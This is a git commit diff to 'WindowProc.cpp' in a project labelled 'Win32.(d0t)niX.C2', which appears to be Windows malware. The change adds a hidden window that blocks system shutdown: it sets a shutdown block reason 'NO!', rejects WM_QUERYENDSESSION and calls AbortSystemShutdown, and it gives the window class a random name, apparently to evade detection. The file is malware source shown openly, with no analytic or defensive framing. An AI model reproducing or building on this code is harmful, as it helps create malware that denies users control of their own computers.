dd9fd351c2ff3448b7fcdbd0dc9df31823d2d0f6
Lima X <35961248+Lima-X-Coding@users.noreply.github.com>
2019-10-25 17:29:51 +0200

    Update WindowProc.cpp
    -small changes

--- Win32.(d0t)niX.C2/(d0t)niX/Source-Files/Utilities/WindowProc.cpp
+++ Win32.(d0t)niX.C2/(d0t)niX/Source-Files/Utilities/WindowProc.cpp
@@ -12,28 +12,37 @@
 #include "../../Header-Files/pch.h"
 #include "../../Header-Files/(d0t)niX.h"
 
-LRESULT CALLBACK WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
+LRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
 	switch (uMsg) {
-
+		case WM_CREATE:
+			ShutdownBlockReasonCreate(hWnd, L"NO!");
+		break;
+		case WM_QUERYENDSESSION:
+			return FALSE;
+		break;
+		case WM_ENDSESSION:
+			AbortSystemShutdown(NULL);
+		default:
+			return DefWindowProc(hWnd, uMsg, wParam, lParam);
 	}
 
-	return DefWindowProc(hwnd, uMsg, wParam, lParam);
+	return DefWindowProc(hWnd, uMsg, wParam, lParam);
 }
 
 DWORD WINAPI thWindowThread(
 	_In_ LPVOID lParam
 ) {
-	WNDCLASSEX wc;
-	ZeroMemory(&wc, sizeof(wc));
+	WNDCLASSEX wcex;
+	ZeroMemory(&wcex, sizeof(wcex));
 
-	wc.cbSize = sizeof(wc);
-	wc.lpfnWndProc = WndProc;
-	wc.lpszClassName = fnCryptGenRandomStringW(NULL, nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN), szCharSet, cculCharSet);
+	wcex.cbSize = sizeof(wcex);
+	wcex.lpfnWndProc = WndProc;
+	wcex.lpszClassName = fnCryptGenRandomStringW(NULL, nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN), szCharSet, cculCharSet);
 
-	RegisterClassEx(&wc);
+	RegisterClassEx(&wcex);
 
-	HWND hwnd = CreateWindowEx(0, wc.lpszClassName, wc.lpszClassName, WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, NULL, NULL, NULL, NULL);
-	if (hwnd) {
+	HWND hWnd = CreateWindowEx(0, wcex.lpszClassName, wcex.lpszClassName, WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, NULL, NULL, NULL, NULL);
+	if (hWnd) {
 		MSG mMsg; BOOL bRet;
 		while ((bRet = GetMessage(&mMsg, NULL, 0, 0)) != 0) {
 			if (bRet == -1) {
@@ -45,5 +54,5 @@ DWORD WINAPI thWindowThread(
 		}
 	}
 
-	delete[] wc.lpszClassName;
+	delete[] wcex.lpszClassName;
 }
